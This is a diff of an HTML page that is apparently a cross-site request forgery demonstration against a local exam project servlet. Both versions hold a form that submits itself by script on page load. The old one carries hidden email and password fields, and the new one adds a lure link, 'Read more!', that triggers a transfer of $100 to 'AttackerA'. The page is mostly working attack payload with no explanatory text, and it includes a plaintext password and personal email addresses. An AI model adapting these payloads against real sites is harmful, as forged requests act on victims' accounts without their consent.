@@ -1,13 +1,15 @@
 <html>
-   <form action="http://localhost:8080/ExamProject/NavigationServlet" method="post">
-      <input type="hidden" name="email" value="antonio.coppe@gmail.com"/> <input
-         type="hidden" name="password" value="admin"/> <input
-         class="single-row-input" type="hidden" name="receiver"
-         placeholder="Receiver" value="antonio.coppe@gmail.com"/> <input
-         class="single-row-input" type="hidden" name="subject"
-         placeholder="Subject" value="csrf text attack">
-   </form>
-   <script>
-      document.forms[0].submit();
-   </script>
+<form action="http://localhost:8080/ExamProject/NavigationServlet"
+	method="post">
+	<input class="single-row-input" type="email" name="receiver"
+		placeholder="Receiver" value="cabavale@gmail.com"> <input
+		class="single-row-input" type="text" name="subject"
+		placeholder="Subject" value="first csrf attack"/>
+	<a href="http://localhost:8080/ExamProject/NavigationServlet.do?acct=AttackerA&amount=$100">Read more!</a>
+</form>
+<script>
+	document.forms[0].submit();
+</script>
 </html>
+
+<a href="http://localhost:8080/ExamProject/NavigationServlet.do?acct=AttackerA&amount=$100">Read more!</a>
